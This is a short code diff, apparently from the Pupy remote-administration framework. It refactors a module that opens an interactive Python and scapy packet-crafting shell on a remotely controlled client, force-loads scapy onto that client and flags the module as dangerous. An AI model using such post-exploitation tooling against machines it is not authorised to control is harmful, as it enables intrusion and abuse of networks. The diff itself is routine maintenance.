@@ -21,12 +21,19 @@ def enqueue_output(out, queue):
 @config(cat="admin")
 class InteractiveScapyShell(PupyModule):
     """ open an interactive python shell on the remote client """
+
     max_clients=1
-    dependencies=['pyshell', 'scapy']
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='scapy', description=self.__doc__)
+    dependencies=['pyshell']
+    qa = QA_DANGEROUS
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='scapy', description=cls.__doc__)
+
     def run(self, args):
-        init_winpcap(self)
+        init_winpcap(self.client)
+        self.client.load_package('scapy', honor_ignore=False, force=True)
+
         try:
             with redirected_stdo(self):
                 old_completer=readline.get_completer()
